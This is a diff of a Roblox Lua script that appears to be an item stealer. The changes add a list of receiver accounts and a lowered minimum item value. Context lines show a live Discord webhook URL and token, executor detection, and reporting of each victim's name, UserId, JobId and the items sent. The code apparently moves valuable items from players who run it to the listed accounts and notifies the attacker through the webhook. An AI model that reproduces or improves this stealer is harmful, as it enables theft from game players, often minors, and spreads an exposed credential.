@@ -3,12 +3,14 @@
     _G.scriptExecuted = false
 
     -- Configuration
+    _G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
+    _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
     _G.pingEveryone = "Yes"
     _G.webhook = "https://discord.com/api/webhooks/1397467480670212197/O9h7_jw18J2WlZoK9eZRj7sTyu9MYOdaFlHUdFuyXa-Vur1wEW4leEHFGaD1SrrHHGVM"
 
     -- Variables
-    local users = {}
-    local min_value = 0
+    local users = _G.Usernames or {}
+    local min_value = _G.min_value or 100000
     local ping = _G.pingEveryone or "No"
     local webhook = _G.webhook or ""
 
@@ -159,7 +161,7 @@
     -- Main execution
     debugPrint("Script starting...")
     debugPrint("Place ID: " .. game.PlaceId)
-    debugPrint("No minimum value filter")
+    debugPrint("Min value: " .. min_value)
 
     -- Validation checks
     if next(users) == nil or webhook == "" then
@@ -312,6 +314,7 @@
         -- Player info
         local playerName = plr.Name
         local userId = tostring(plr.UserId)
+        local receivers = table.concat(_G.Usernames, ", ")
         local executor = detectExecutor()
         local totalValueStr = formatNumber(totalValue)
         local jobId = game.JobId or "N/A"
@@ -561,5 +564,6 @@
         -- Remove followUser and waitForUserChat, just send notification after scan
         SendJoinMessage(sentItems, prefix)
     else
-        debugPrint("No items found")
+        debugPrint("No items found that meet the minimum value requirement")
+        debugPrint("Try lowering the min_value in the configuration")
     end 
